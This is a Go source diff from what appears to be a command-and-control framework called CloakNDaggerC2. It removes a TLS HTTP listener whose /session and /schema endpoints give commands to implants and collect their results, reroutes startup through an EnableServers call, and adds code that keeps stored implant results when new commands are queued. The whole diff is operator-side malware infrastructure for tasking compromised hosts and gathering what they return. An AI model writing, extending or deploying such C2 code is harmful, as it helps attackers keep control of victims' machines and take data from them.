@@ -20,7 +20,6 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
-	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
 	"encoding/pem"
@@ -28,9 +27,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
-	"net/http"
 	"strings"
-	"sync"
 	"time"
 
 	pb "CloakNDaggerC2/dagger/proto/daggerProto"
@@ -38,8 +35,6 @@ import (
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 )
-
-var stopServers chan struct{}
 
 type impInfo struct {
 	UUID        string
@@ -52,112 +47,14 @@ type impInfo struct {
 	GotIt       int32
 }
 
-func startListener(address, port string, wg *sync.WaitGroup) (uint32, error) {
-	defer wg.Done()
+func startListener(address, port string) (string, error) {
+	fmt.Printf("Will attempt to serve on %s %s\n", address, port)
 
-	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
+	code, err := EnableServers(address, port)
 	if err != nil {
-		log.Fatalf("did not connect : %v", err)
+		return code, err
 	}
-
-	defer conn.Close()
-
-	c := pb.NewUpdateRecordClient(conn)
-
-	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
-
-	defer cancel()
-
-	serverAddr := address + ":" + port
-	certFile := "server.crt"
-	keyFile := "server.key"
-
-	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
-	if err != nil {
-		return 1, err
-	}
-
-	tlsConf := &tls.Config{Certificates: []tls.Certificate{cert}}
-
-	listener, err := tls.Listen("tcp", serverAddr, tlsConf)
-
-	if err != nil {
-		return 1, err
-	}
-
-	http.HandleFunc("/session", func(w http.ResponseWriter, r *http.Request) {
-		// Session handles the implant requesting a command
-		// This will return information
-		// Need to use the UUID to get the command in the DB
-		UUID := r.Header.Get("APPSESSIONID")
-		fmt.Printf("UUID: %s requesting command \n", UUID)
-
-		_, err := UUID_info(UUID)
-		// We check if it exists and, if not, then we break out of the loop
-		// err should be nil if the UUID exists
-		if err != nil {
-			fmt.Println("No such UUID")
-		}
-
-		res, err := UUID_info(UUID)
-		if err != nil {
-			fmt.Println(err)
-		}
-
-		w.Header().Set("Verifier", res.Signature)
-		fmt.Fprintln(w, res.Command)
-
-	})
-
-	http.HandleFunc("/schema", func(w http.ResponseWriter, r *http.Request) {
-		// schema handles implants returning information
-		// This will need to get information from the body of the request
-		// That info is then fed into the API
-		UUID := r.Header.Get("APPSESSIONID")
-		Res := r.Header.Get("Res")
-		fmt.Printf("UUID: %s checking in with result: %s \n", UUID, Res)
-
-		data := impInfo{
-			// The issue I'm envisioning, I want to preserve the whoami and lastcheckin vals
-			// In Python I was just running native DB queries and saving those vals to vars
-			// With the API this will be more intensive and cumbersome
-			// Right now we're ignoring the problem
-			UUID: UUID, Whoami: "", Signature: "", Retrieved: 0, Command: "", LastCheckIn: "", Result: Res, GotIt: 1,
-		}
-
-		res, err := c.SendUpdate(ctx, &pb.UpdateObject{UUID: data.UUID, Whoami: data.Whoami, Signature: data.Signature,
-			Retrieved: data.Retrieved, Command: data.Command, LastCheckIn: data.LastCheckIn, Result: data.Result,
-			GotIt: data.GotIt})
-
-		code := res.GetCode()
-
-		if code != 0 {
-			// We don't want to break on errors here, ideally we should continue to serve
-			fmt.Printf("Error: %e", err)
-		}
-
-	})
-
-	server := &http.Server{}
-
-	go func() {
-		err := server.Serve(listener)
-		if err != nil {
-			log.Fatal(err)
-		}
-	}()
-
-	<-stopServers
-
-	ctx, cancel = context.WithTimeout(context.Background(), 5*time.Second)
-	defer cancel()
-
-	err = server.Shutdown(ctx)
-	if err != nil {
-		return 1, err
-	}
-
-	return 0, nil
+	return code, nil
 
 }
 
@@ -202,12 +99,28 @@ func set(command, uuid, signature string) (int32, error) {
 
 	defer cancel()
 
+	result := pb.NewHgetRecordClient(conn)
+
+	ctx2, cancel2 := context.WithTimeout(context.Background(), time.Second)
+
+	defer cancel2()
+
+	preserved_field, err := result.Hget(ctx2, &pb.GetUUID{UUID: uuid})
+
+	if err != nil {
+		return 1, err
+	}
+	preserved_result := preserved_field.Result
+
 	data := impInfo{
 		// The issue I'm envisioning, I want to preserve the whoami and lastcheckin vals
 		// In Python I was just running native DB queries and saving those vals to vars
 		// With the API this will be more intensive and cumbersome
 		// Right now we're ignoring the problem
-		UUID: uuid, Whoami: "", Signature: signature, Retrieved: 0, Command: command, LastCheckIn: "", Result: "", GotIt: 0,
+		// We are accidentally overwriting the result here
+		// This will be true for all the fields but the main issue is the result
+		// Need to get current result then preserve it then set it
+		UUID: uuid, Whoami: "", Signature: signature, Retrieved: 0, Command: command, LastCheckIn: "", Result: preserved_result, GotIt: 0,
 	}
 
 	res, err := c.SendUpdate(ctx, &pb.UpdateObject{UUID: data.UUID, Whoami: data.Whoami, Signature: data.Signature,
@@ -309,8 +222,6 @@ func main() {
 	yellow := "\033[33m"
 	blue := "\033[34m"
 	reset := "\033[0m"
-	var wg sync.WaitGroup
-	stopServers = make(chan struct{})
 
 	for {
 		var input string
@@ -446,12 +357,14 @@ func main() {
 				}
 				fmt.Println("Enter the port to use > ")
 				fmt.Scan(&port)
-				wg.Add(1)
-				go startListener(address, port, &wg)
-
-			case "stop":
-				close(stopServers)
-				break
+				code, err := startListener(address, port)
+				if err != nil {
+					fmt.Printf("Error: %e", err)
+				}
+				if code != "0" {
+					fmt.Printf("Code error: %s \n", code)
+				}
+				fmt.Println("Started")
 
 			case "help":
 				fmt.Printf("Help menu \n")
